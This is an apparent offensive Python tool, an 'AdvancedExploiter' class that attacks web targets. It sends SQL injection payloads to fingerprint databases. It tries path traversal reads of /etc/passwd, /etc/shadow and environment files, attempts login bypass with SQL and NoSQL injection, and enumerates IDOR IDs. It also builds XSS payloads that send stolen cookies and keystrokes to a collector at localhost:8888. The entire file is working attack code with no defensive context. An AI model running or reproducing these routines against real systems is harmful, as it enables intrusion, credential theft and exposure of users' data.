import requests
import json
import base64
import hashlib
import random
import string
from urllib.parse import urljoin

class AdvancedExploiter:
    def __init__(self, target):
        self.target = target
        self.session = requests.Session()
        self.vulnerabilities = []
        
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        })
    
    def exploit_sql_injection(self, vulnerable_url):
        """Advanced SQL Injection exploitation"""
        print(f"Attempting SQLi exploitation on: {vulnerable_url}")
        
        # Database fingerprinting
        db_payloads = {
            'mysql': "' AND 1=1 UNION SELECT 1,version(),3,4--",
            'postgresql': "' AND 1=1 UNION SELECT 1,version(),3,4--", 
            'mssql': "' AND 1=1 UNION SELECT 1,@@version,3,4--",
            'oracle': "' AND 1=1 UNION SELECT 1,banner,3,4 FROM v$version--"
        }
        
        for db_type, payload in db_payloads.items():
            try:
                test_url = vulnerable_url + payload
                response = self.session.get(test_url, timeout=10)
                
                if any(indicator in response.text.lower() for indicator in ['mysql', 'postgresql', 'microsoft', 'oracle']):
                    print(f"[+] Database type: {db_type}")
                    
                    # Extract database version
                    if 'version()' in payload or '@@version' in payload:
                        # Parse version from response
                        print(f"[+] Database version potentially exposed")
                    
                    break
                    
            except Exception as e:
                pass
    
    def exploit_xss(self, vulnerable_url):
        """Advanced XSS exploitation"""
        print(f"Exploiting XSS on: {vulnerable_url}")
        
        # Steal cookies payload
        steal_cookies_payload = """
        <script>
        var img = new Image();
        img.src = 'http://localhost:8888/steal?c=' + document.cookie;
        </script>
        """
        
        # Keylogger payload
        keylogger_payload = """
        <script>
        document.onkeypress = function(e) {
            var img = new Image();
            img.src = 'http://localhost:8888/key?k=' + e.key;
        }
        </script>
        """
        
        print("[+] XSS payloads generated for cookie stealing and keylogging")
        print(f"    Cookie stealer: {steal_cookies_payload[:50]}...")
        print(f"    Keylogger: {keylogger_payload[:50]}...")
    
    def exploit_file_inclusion(self, vulnerable_url):
        """Exploit file inclusion vulnerabilities"""
        print(f"Exploiting file inclusion on: {vulnerable_url}")
        
        # Try to read various sensitive files
        sensitive_files = {
            '/etc/passwd': 'System users',
            '/etc/shadow': 'Password hashes', 
            '/proc/self/environ': 'Environment variables',
            '../../../../windows/system32/drivers/etc/hosts': 'Windows hosts file',
        }
        
        for file_path, description in sensitive_files.items():
            try:
                if '?' in vulnerable_url:
                    exploit_url = vulnerable_url + f"../../../../../../{file_path}"
                else:
                    exploit_url = f"{vulnerable_url}?file=../../../../../../{file_path}"
                
                response = self.session.get(exploit_url, timeout=10)
                
                if response.status_code == 200 and len(response.text) > 0:
                    print(f"[+] Successfully read: {file_path}")
                    print(f"    Content preview: {response.text[:100]}...")
                    
            except Exception as e:
                pass
    
    def test_authentication_bypass(self, login_url):
        """Test for authentication bypass vulnerabilities"""
        print(f"Testing authentication bypass on: {login_url}")
        
        bypass_payloads = [
            {"username": "admin", "password": "admin"},
            {"username": "' or '1'='1", "password": "' or '1'='1"},
            {"username": "admin' --", "password": "anything"},
            {"username": "admin' /*", "password": "anything"},
            {"username": "admin", "password": {"$ne": "wrong"}},  # NoSQL injection
        ]
        
        for payload in bypass_payloads:
            try:
                response = self.session.post(login_url, data=payload, timeout=10)
                
                if any(indicator in response.text.lower() for indicator in ['welcome', 'dashboard', 'logout', 'success']):
                    print(f"[+] Authentication bypass successful with: {payload}")
                    return True
                    
            except Exception as e:
                pass
        
        return False
    
    def test_idor(self, url_pattern):
        """Test for Insecure Direct Object References"""
        print(f"Testing IDOR on: {url_pattern}")
        
        # Test sequential IDs
        test_ids = [1, 2, 100, 1000, 12345]
        
        for test_id in test_ids:
            test_url = url_pattern.replace('{id}', str(test_id))
            
            try:
                response = self.session.get(test_url, timeout=5)
                
                if response.status_code == 200:
                    print(f"[+] Potential IDOR: Accessible resource at ID {test_id}")
                    
            except Exception as e:
                pass
    
    def run_exploitation(self, vulnerability_type, target_url, additional_info=None):
        """Run appropriate exploitation based on vulnerability type"""
        print(f"\n\033[91m[EXPLOITATION] Targeting: {target_url}\033[0m")
        
        if 'SQL Injection' in vulnerability_type:
            self.exploit_sql_injection(target_url)
        
        elif 'XSS' in vulnerability_type:
            self.exploit_xss(target_url)
        
        elif 'Directory Traversal' in vulnerability_type:
            self.exploit_file_inclusion(target_url)
        
        elif 'Authentication' in vulnerability_type:
            self.test_authentication_bypass(target_url)
        
        elif 'IDOR' in vulnerability_type:
            self.test_idor(target_url)